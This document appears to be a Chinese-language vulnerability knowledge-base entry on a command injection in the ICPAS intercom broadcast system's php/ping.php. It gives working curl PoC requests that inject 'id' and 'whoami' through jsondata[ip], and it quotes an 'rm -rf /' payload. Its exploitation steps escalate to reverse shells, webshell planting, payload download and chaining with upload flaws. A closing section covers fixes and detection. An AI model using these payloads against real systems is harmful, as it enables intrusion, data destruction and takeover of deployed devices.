---
id: web-php-rce-icpas-ping-ip-exec-command-injection
title: ICPAS php/ping.php 将 ip/times 拼入 exec 执行 ping：jsondata[ip] 分号/管道命令注入
type: scenario
domain: web
path: web/php/rce
technique: icpas-ping-ip-exec-command-injection
aliases:
- ICPAS ping.php 命令注入
- IP 网络对讲广播系统 RCE
- ping exec ip 拼接
- jsondata[ip] 命令注入
tags:
- php
- rce
- command-injection
- exec
- ping
- icpas
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V222
  verified_at: '2026-11-07T07:07:22+08:00'
  notes: 已对照原文 AI 报告与 ping.php exec 行号核对：ip/times 拼接 exec 命令注入成立；原文未实际执行请求，confidence medium 合理。
---

## 一句话结论

ICPAS 的 `php/ping.php` 在网络检测分支中把用户可控的 `ip`（以及 `times`）直接拼进 `exec` 执行的 `ping` 命令行，未做 IP 白名单或 shell 转义；攻击者提交 `jsondata[ip]=127.0.0.1; whoami`（Windows 可用 `&`）即可在服务器上执行任意系统命令。

## 原理

- `ping.php` 根据 `jsondata[type]` 选择不同检测分支，`type=2` 分支执行类似 `exec("ping -c $times $ip", $info)` 的命令；`$ip`/`$times` 直接来自 POST 参数。
- `exec()` 把字符串交给系统 shell（Linux `/bin/sh -c`、Windows `cmd.exe /c`），因此 `;`、`|`、`&`、反引号、`$()` 等元字符会截断/追加命令，`ping` 只执行前半段，后半段由 shell 继续执行。
- 代码没有 `escapeshellarg()`/`escapeshellcmd()`，也没有用 `filter_var($ip, FILTER_VALIDATE_IP)` 校验，所以任意命令都能注入。
- 文章中的 AI 审计同时指出 `ping.php` 第 27/29/31/36/38/40 行存在 `exec` 调用，`ip` 未过滤直接拼接；表格式 PoC 使用 `jsondata[type]=2&jsondata[ip]=whoami`，AI 报告使用 `ip=127.0.0.1; rm -rf /`。

## 触发条件

- 目标为 ICPAS/IP 网络对讲广播系统，`php/ping.php` 可访问且无需（或低权限即可）通过认证。
- PHP 未禁用 `exec`（或 `exec` 可用）。
- 请求能控制 `jsondata[ip]`/`jsondata[times]`，且 `type` 命中执行 ping 的分支（原文为 `type=2`）。

## 利用步骤

1. 访问或抓取 `php/ping.php` 的正常请求，确认参数结构为 `jsondata[type]`、`jsondata[ip]`、可能的 `jsondata[times]`。
2. 发送 `type=2`，`ip` 填合法 IP 加命令分隔符，如 `127.0.0.1; whoami`（Linux）或 `127.0.0.1 & whoami`（Windows）。
3. 观察响应中的命令输出；若回显受限，可改用 `curl`/`certutil` 下载或写文件后通过 Web 访问。
4. 进一步可反弹 shell 或写入 webshell；写入位置可结合本系统的上传/任意写漏洞。

## PoC

```bash
# Linux 目标
curl -s -X POST 'http://target/php/ping.php' \
  --data-urlencode 'jsondata[type]=2' \
  --data-urlencode 'jsondata[ip]=127.0.0.1; id'

# Windows 目标
curl -s -X POST 'http://target/php/ping.php' \
  --data-urlencode 'jsondata[type]=2' \
  --data-urlencode 'jsondata[ip]=127.0.0.1 & whoami'
```

## 变体与关联

- **times 参数**：若 `times` 同样未过滤，可注入 `1; id` 等；即使只过滤 `ip`，也要检查 `times`。
- **其他分支**：`type` 的不同取值可能走到 `tracert`、`ping -n` 等其它 `exec` 行，注入点可能不止一处。
- **无回显**：可用时间盲注（`; sleep 5`）、DNS 外带或写入 Web 目录后访问。
- **关联**：与本系统 `addscenedata.php` 任意上传、`uploadjson.php` 任意写卡配合，可将命令执行升级为稳定 webshell。

## 检测与防御

- **修复**：用 `filter_var($ip, FILTER_VALIDATE_IP)` 强校验 IPv4/IPv6；`times` 强制整数并限制范围；优先使用 `escapeshellarg()` 并对每个参数单独转义，或改用 PHP 原生 ICMP 库/受控封装，避免拼接 shell 命令。
- **加固**：`disable_functions` 禁用 `exec`/`shell_exec`/`system`/`passthru`（注意可被其他方式绕过）；Web 进程最小权限运行。
- **检测**：审计 `ping.php` 请求中的 `;`、`|`、`&`、反引号、`$(` 等字符；监控 Web 进程启动 `sh -c`/`cmd.exe` 及异常子进程。
